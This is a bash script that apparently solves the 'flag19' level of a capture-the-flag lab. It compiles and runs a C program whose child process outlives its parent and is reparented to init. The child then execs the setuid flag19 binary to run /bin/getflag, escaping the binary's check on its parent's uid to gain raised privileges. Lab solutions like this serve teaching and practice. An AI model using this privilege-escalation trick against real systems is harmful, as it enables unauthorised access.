#!/usr/bin/env bash

cat >/tmp/flag19.c <<EOF
#include <unistd.h>

int main(int argc, char** argv) {
    char* cmd = "/home/flag19/flag19";
    char* const getflag[] = {cmd, "/bin/getflag", 0};

    if (fork() == 0) { // child
        sleep(1);
        execv(cmd, getflag);
    }

    return 0;
}
EOF

gcc -o /tmp/flag19.bin /tmp/flag19.c
/tmp/flag19.bin
rm -f /tmp/flag19*
